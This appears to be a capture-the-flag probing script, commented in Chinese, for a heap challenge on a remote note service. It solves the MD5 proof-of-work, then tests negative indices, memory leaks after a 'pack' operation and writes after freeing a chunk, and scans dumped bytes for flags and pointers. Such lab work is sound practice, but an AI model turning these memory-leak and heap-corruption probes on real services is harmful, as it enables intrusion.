"""514 (Ancient-Recall) 实验批次脚本。
一次连接内跑完多组假设验证，并把所有 raw 回显落盘，便于离线分析。

用法：python3 probe514_batch.py HOST PORT
"""
import hashlib
import itertools
import re
import socket
import string
import sys
import time

HOST, PORT = sys.argv[1], int(sys.argv[2])
LOGFILE = "/home/mzj/pwn-lab/platform/raw514.log"


def drain(s, wait=0.7):
    s.settimeout(0.22)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(16384)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=8)
        banner = drain(self.s, 1.5)
        masked = re.search(rb"Token:\s*([A-Za-z_]+)", banner).group(1).decode()
        md5hex = re.search(rb"MD5:\s*([0-9a-f]{32})", banner).group(1).decode()
        missing = solve_pow(md5hex, masked)
        self.log("POW %s -> %s" % (masked, missing))
        self.send(missing, 1.2)

    def log(self, *parts):
        line = " ".join(str(p) for p in parts)
        print(line, flush=True)
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def send(self, line, wait=0.7):
        try:
            self.s.sendall(str(line).encode() + b"\n")
        except OSError as e:
            self.log("SEND-FAIL", repr(e))
            return b""
        r = drain(self.s, wait)
        self.log(">>> %s" % line, repr(r[:400]))
        return r

    def show(self, idx, prefix=""):
        self.send(3)
        r = self.send(idx, 0.9)
        return r

    def dump_of(self, r):
        m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
        if not m:
            return None
        return int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())


def menu_create(c, idx, title, reserve, length, hexdata):
    c.send(1); c.send(idx); c.send(title); c.send(reserve); c.send(length); return c.send(hexdata)


c = Conn()

c.log("\n===== 批次 1：下标边界 / 负数 =====")
for idx in ["-1", "-2", "7", "8", "0"]:
    c.send(3)
    r = c.send(idx)
    c.log("  show(%s) ->" % idx, repr(r[:120]))

c.log("\n===== 批次 2：pack 泄漏值随操作的变化 =====")
menu_create(c, 0, "a", 64, 64, "0e0f" * 32)
r = c.show(0)
c.log("  before pack:", c.dump_of(r) and c.dump_of(r)[2].hex())
c.send(4); c.send(0)
r = c.show(0)
d = c.dump_of(r)
c.log("  after pack1: len=%d cap=%d" % (d[0], d[1]), d[2].hex())
c.send(4); c.send(0)
r = c.show(0)
d = c.dump_of(r)
c.log("  after pack2: len=%d cap=%d" % (d[0], d[1]), d[2].hex())

c.log("\n===== 批次 3：pack 后 edit 写满 cap，看写入落点与后续复用 =====")
menu_create(c, 1, "b", 32, 32, "101112131415161718191a1b1c1d1e1f" * 2)
c.send(5); c.send(1)          # delete 1 -> 释放
c.send(4); c.send(0)          # pack 0 -> 收缩
c.send(2); c.send(0); c.send(40); c.send("41" * 40)   # edit 0 写满 cap=72? 用 40 试探
r = c.show(0)
d = c.dump_of(r)
c.log("  after edit(40): len=%d cap=%d" % (d[0], d[1]), d[2].hex())
menu_create(c, 2, "c", 32, 32, "5152535455565758595a5b5c5d5e5f60" * 2)
r = c.show(2)
d = c.dump_of(r)
c.log("  new note2:", d and ("len=%d cap=%d " % (d[0], d[1])) + d[2].hex())

c.log("\n===== 批次 4：全槽 dump（扫描 flag / 指针） =====")
alldata = b""
for i in range(8):
    r = c.show(i)
    d = c.dump_of(r)
    if d:
        alldata += d[2]
        c.log("  slot %d: len=%d cap=%d" % (i, d[0], d[1]), d[2][:64].hex())
c.log("  总共泄漏字节:", len(alldata))
c.log("  flag 字样:", re.findall(rb"[Ff][Ll][Aa][Gg].{0,30}", alldata)[:5])
ptrs = [int.from_bytes(alldata[i:i + 8], "little") for i in range(0, max(0, len(alldata) - 8), 8)]
susp = sorted({hex(p) for p in ptrs if 0x10000 < p < 0x800000000000})
c.log("  可疑指针（前 20）:", susp[:20])
c.s.close()